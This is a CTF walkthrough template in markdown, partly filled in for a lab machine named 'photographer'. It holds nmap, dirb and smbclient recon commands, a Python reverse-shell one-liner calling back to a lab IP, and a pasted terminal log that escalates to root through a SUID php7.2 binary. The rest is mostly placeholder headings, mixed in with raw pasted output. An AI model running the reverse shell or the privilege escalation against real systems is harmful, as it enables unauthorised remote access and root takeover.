@@ -1,0 +1,168 @@
+# CTF Walkthrough
+
+## Machine Details
+- **Target IP:** 10.10.10.X
+- **Difficulty:** [Easy/Medium/Hard]
+- **Technologies:** [List relevant technologies]
+
+## 1. Setup Instructions
+- Prepare virtual machine
+- Configure network settings
+- Ensure necessary tools are installed
+
+## 2. Reconnaissance (Recon)
+
+### Network Scanning
+```bash
+# Discover network hosts
+netdiscover -r 10.10.10.0/24
+
+# Comprehensive port scanning
+nmap -sV -v -Pn 10.10.10.X
+nmap -sC -A -v -p- 10.10.10.X
+```
+
+### Scan Results
+```
+PORT     STATE SERVICE     VERSION
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+
+
+## 3. Enumeration
+- Identify services
+- Look for potential vulnerabilities
+- Check configuration files
+- Explore web applications
+
+dirb http://10.10.10.33/ -d /usr/share/wordlists/common.txt 
+
+smbclient -N -L \\\\10.10.10.33
+
+http://10.10.10.33:8000/admin/#/library/content/selection:3
+
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.4",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+## 4. Vulnerability Identification
+
+### Vulnerability Discovery
+- **Vulnerable Version:** 
+- **Exploit Source:** 
+
+### Vulnerability Details
+⚠️ **Vulnerability Name**
+- Detailed vulnerability description
+- Potential impact
+
+### Exploit Preparation
+```bash
+# Exploit execution commands
+```
+k
+sudo: 3 incorrect password attempts
+www-data@photographer:/var/www/html/koken/storage/originals/1f/bc$ k
+k: command not found
+www-data@photographer:/var/www/html/koken/storage/originals/1f/bc$ find / -perm -u=s 2>/dev/null
+<www/html/koken/storage/originals/1f/bc$ find / -perm -u=s 2>/dev/null       
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/sbin/pppd
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/php7.2
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/chfn
+/bin/ping
+/bin/fusermount
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/su
+www-data@photographer:/var/www/html/koken/storage/originals/1f/bc$ CMD="/bin/sh"
+<www/html/koken/storage/originals/1f/bc$ CMD="/bin/sh"                       
+www-data@photographer:/var/www/html/koken/storage/originals/1f/bc$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
+<ginals/1f/bc$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"           
+# id
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+# cd /root
+cd /root
+# ls
+ls
+proof.txt
+# cat proof.txt
+cat proof.txt
+                                                                   
+                    
+### Important Exploitation Notes
+- Specific challenges
+- Potential modification requirements
+- Compatibility considerations
+
+## 5. Exploitation Techniques
+
+### Primary Exploitation Method
+```bash
+# Exploitation code/commands
+```
+
+### Exploitation Steps
+1. Step-by-step exploitation process
+2. Detailed commands
+3. Potential variations
+
+## 6. Privilege Escalation
+
+### Privilege Escalation Techniques
+```bash
+# Privilege escalation commands
+find / -perm -u=s -type f 2>/dev/null
+```
+
+## 7. Post-Exploitation
+- Maintain system access
+- Collect additional information
+- Identify further exploitation paths
+
+## 8. Flag Collection
+```bash
+# Typical flag locations
+cd /root
+cat *flag*.txt
+```
+
+## 9. Conclusion
+- Summarize exploitation technique
+- Document lessons learned
+- Note effective tools and methods
+
+## 10. Recommendations
+- Security improvements
+- Patch recommendations
+- Best practices
+
+## Appendix: Potential Challenges
+- Specific technical challenges
+- Debugging tips
+- Potential roadblocks
+
+### References
+- [Relevant Security Resources]
+- [Exploit Details]
+
+## Author's Notes
+🔍 **Debugging Tips:**
+- Key insights
+- Personal observations
+- Lessons learned
